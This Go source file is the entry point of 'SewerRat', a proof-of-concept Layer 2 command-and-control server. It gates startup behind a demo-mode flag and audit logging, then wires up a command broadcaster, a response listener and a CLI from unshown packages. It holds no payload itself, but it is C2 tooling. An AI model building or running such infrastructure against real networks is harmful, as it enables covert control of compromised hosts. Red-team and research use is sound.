package main

import (
	"flag"
	"log"
	"time"

	"sewerrat/server"
	"sewerrat/shared"
)

func main() {
	// Parse command-line flags
	iface := flag.String("i", "eth0", "Network interface to use")
	timeout := flag.Duration("t", 10*time.Second, "Response timeout")
	demoMode := flag.Bool("demo-mode", false, "Require explicit demo mode before sending commands")
	flag.Parse()

	logPath, err := shared.SetupAuditLogger("server")
	if err != nil {
		log.Fatalf("[!] failed to configure server audit logging: %v\n", err)
	}
	if !*demoMode {
		log.Fatalf("[!] refusing to start without -demo-mode; audit log would have been written to %s\n", logPath)
	}

	// Banner
	log.Println(`
╔═══════════════════════════════════╗
║     SewerRat C2 Server (PoC)      ║
║     Layer 2 Command & Control     ║
╚═══════════════════════════════════╝
	`)
	log.Printf("[AUDIT] server demo mode enabled; audit_log=%s interface=%s timeout=%v\n", logPath, *iface, *timeout)

	// Create broadcaster
	broadcaster, err := server.NewCommandBroadcaster(*iface)
	if err != nil {
		log.Fatalf("[!] Failed to create broadcaster: %v\n", err)
	}
	defer broadcaster.Close()

	// Create listener
	listener, err := server.NewResponseListener(*iface)
	if err != nil {
		log.Fatalf("[!] Failed to create listener: %v\n", err)
	}
	defer listener.Stop()

	// Start listener in background
	if err := listener.StartAsync(); err != nil {
		log.Fatalf("[!] Failed to start listener: %v\n", err)
	}

	// Small delay to ensure listener is ready
	time.Sleep(100 * time.Millisecond)

	// Create and start CLI handler
	cli := server.NewCLIHandler(broadcaster, listener, *timeout)
	if err := cli.Start(); err != nil {
		log.Fatalf("[!] CLI error: %v\n", err)
	}
}
